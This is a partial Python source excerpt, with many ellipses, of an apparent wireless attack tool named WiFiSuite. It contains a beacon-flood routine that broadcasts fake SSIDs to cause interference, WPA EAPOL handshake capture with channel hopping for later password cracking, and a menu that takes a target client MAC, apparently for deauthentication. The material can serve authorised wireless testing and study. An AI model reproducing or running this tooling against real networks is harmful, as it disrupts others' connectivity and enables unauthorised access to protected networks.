...
class WiFiSuite:
        ...
        try:
            ...
            if os.path.exists(mode_path):
                with open(mode_path, 'r') as f:
                    ...
                    if f.read().strip() != "803":
                        console.print(f"[yellow][!] Warning: {iface} might not be in Monitor Mode.[/yellow]")
        except Exception:
            pass
    ...
    def beacon_flood(self, iface):
        ...
        ssids = ["Free Public WiFi", "Home_Network_Ext", "Starbucks_Unsecured", "FBI Surveillance Van"]
        pkts = []
        for s in ssids:
            # Generate a random-ish MAC for each SSID
            mac = "00:11:22:{:02x}:{:02x}:{:02x}".format(time.time_ns()%255, time.time_ns()%250, time.time_ns()%245)
        ...
        console.print("[bold red][!] Flooding beacons. Interference started...[/bold red]")
        try:
            while True:
                for p in pkts:
    ...
    def capture_handshake(self, iface, bssid):
        ...
        hopper = threading.Thread(target=self.channel_hopper, args=(iface,), daemon=True)
        hopper.start()

        # Filter for EAPOL (Handshake) or specific BSSID traffic
        # EAPOL type is 0x888e
        captured_handshakes = []
        ...
        def packet_handler(pkt):
            if pkt.haslayer(Dot11):
                ...
                if pkt.haslayer('EAPOL'):
                    ...
                    console.print(f"[bold green][+] Captured EAPOL Packet from {pkt.addr2}[/bold green]")
        ...
        try:
            ...
            if captured_handshakes:
                ...
                console.print(f"[bold green][!] Success: Handshake saved to {fname}[/bold green]")
            else:
                console.print("[red][!] Timeout: No handshake captured within 2 minutes.[/red]")
    ...
    def run(self):
        ...
        iface = console.input("[bold yellow]Monitor Interface (e.g., wlan0mon): [/bold yellow]").strip()
        ...
        if choice == "1":
            target = console.input("Target Client MAC (FF:FF:FF:FF:FF:FF for all): ")
